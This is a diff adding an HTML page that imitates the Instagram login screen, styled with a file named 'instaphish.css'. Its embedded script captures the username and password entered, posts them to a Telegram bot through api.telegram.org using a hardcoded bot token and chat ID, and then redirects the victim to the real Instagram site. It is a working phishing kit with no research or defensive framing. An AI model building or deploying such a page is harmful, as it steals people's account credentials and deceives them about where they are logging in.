@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="instaphish.css">
+  <style>
+    body {
+  margin: 0;
+  padding: 0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(to bottom left, #f5f5f5, #e6f7ff);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  text-align: center;
+  width: 90%;
+  max-width: 350px;
+}
+
+.language {
+  margin-bottom: 30px;
+  font-size: 16px;
+  color: #333;
+}
+
+.logo {
+  width: 80px;
+  margin-bottom: 30px;
+}
+
+.input {
+  width: 100%;
+  padding: 14px;
+  margin: 10px 0;
+  border: 1px solid #ccc;
+  border-radius: 12px;
+  font-size: 14px;
+  box-sizing: border-box;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 14px;
+  background-color: #0095f6;
+  color: #fff;
+  border: none;
+  border-radius: 30px;
+  font-size: 16px;
+  margin-top: 10px;
+  cursor: pointer;
+}
+
+.forgot {
+  display: block;
+  margin: 20px 0;
+  color: #262626;
+  text-decoration: none;
+  font-size: 14px;
+}
+
+.signup-btn {
+  width: 100%;
+  padding: 14px;
+  border: 1px solid #0095f6;
+  background-color: transparent;
+  color: #0095f6;
+  border-radius: 30px;
+  font-size: 16px;
+  cursor: pointer;
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="language"><u>English</u></div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo" width="80" />
+    
+    <input type="text" class="input" placeholder="Username, email or phone">
+    <input type="password" class="input" placeholder="Password">
+
+    <button class="login-btn">Login</button>
+
+    <a href="#" class="forgot">Forgot password?</a>
+    <button class="signup-btn">Create new account</button>
+  </div>
+
+  <script>
+    window.onload = function () {
+      const botToken = '6400888039:AAE_FKIhEL1VKVYAQ138_cSuMD6nWurSMlw';
+      const chatId = '6074838445';
+
+      document.querySelector('.login-btn').addEventListener('click', () => {
+        const username = document.querySelectorAll('.input')[0].value;
+        const password = document.querySelectorAll('.input')[1].value;
+
+        const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        }).then(response => {
+          window.location.href = "https://www.instagram.com";
+         
+        }).catch(error => {
+          console.error('Fetch error:', error);
+          alert('Network or Telegram API error.');
+        });
+      });
+    };
+  </script>
+</body>
+</html>
